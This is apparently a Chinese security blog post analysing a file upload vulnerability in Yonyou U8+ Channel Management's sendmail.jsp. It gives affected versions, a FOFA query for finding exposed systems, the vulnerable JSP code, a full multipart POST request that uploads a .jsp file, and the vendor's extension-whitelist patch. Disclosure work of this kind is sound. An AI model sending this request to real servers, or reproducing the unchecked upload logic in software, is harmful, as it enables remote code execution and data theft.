---
title: "用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-sendmail.jsp-文件上传漏洞
---

# 用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/14 08:30
- 681浏览
- [0评论](#comment)
- 26分钟阅读

深入探索

SQL

sendmail

Sendmail

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友公司推出的企业管理[软件](#)套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `sendmail.jsp` 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

电子邮件与即时消息

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-001-c4d00a15780c.webp)](https://image.mrxn.net/c7e02dd14b054ecdaf84931546224db1.webp)

直接看 `sendmail.jsp` 文件里有关文件处理的实现逻辑

漏洞修复方案

```
<%

    com.gxfcsoft.framework.base.upload.Upload myUpload=new com.gxfcsoft.framework.base.upload.Upload();    
    myUpload.initialize(pageContext);
    myUpload.upload();

    String touser = myUpload.getRequest().getParameter("touser");
    String subject = myUpload.getRequest().getParameter("subject");
    String discerptesend =myUpload.getRequest().getParameter("discerptesend");

    String affix = myUpload.getFiles().getFile(0).getFileName();
    String body = myUpload.getRequest().getParameter("body");

    int iCount = myUpload.getFiles().getFile(0).getSize();

    //System.out.println("iCount="+iCount);

    String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"messageserv"+java.io.File.separator;
    String fileFullName = "";

    if (iCount != 0) {
       String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
       if(affix.indexOf(".")!=-1)
          fieldID +=affix.substring(affix.lastIndexOf("."));

       myUpload.saveAs(path, fieldID);
       fileFullName = path+fieldID;

    }

    %>
```

深入探索

网络安全会议

安全工具开发

技术文章订阅

文件后缀从上传文件名中获取，然后拼接到uuid后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！

物流软件安全

# 漏洞复现

```
POST /business/ums/sendmail.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="touser"

aa@qq.com
------WebKitFormBoundary
Content-Disposition: form-data; name="subject"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="discerptesend"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="body"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp"

UPLOAD_TEST
------WebKitFormBoundary--
```

在响应里成功回显上传文件的完整路径，直接访问

计算机服务器

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-002-a045bd7c7d7e.webp)](https://image.mrxn.net/ed4ee4b6cef74ae287f473a7bbd88d0c.webp)

访问上传文件

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-003-bc14d112831e.webp)](https://image.mrxn.net/c29b5a73adee47738729aec96a2c8536.webp)

成功[执行](https://mrxn.net/tag/rce)我们上传代码

漏洞修复方案

官方补丁修复也很直接，直接正则检测后缀是否为白名单

```
String[] allowedExts = {
                "text", "txt", "doc", "wps", "docx", "xls", "xlsx", "pdf", "zip",
                "ppt", "jpeg", "png", "gif", "jpg", "rar", "xml", "svg"
};

boolean isValid = false;
for (String ext : allowedExts) {
        if (suffix.equals(ext)) {
                isValid = true;
                break;
        }
}

if (isValid) {
        fileFullName = path + fieldID + "." + suffix;
} else {
        fileFullName = ""; // 不合法后缀，避免使用
}
```

# 参考

- [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
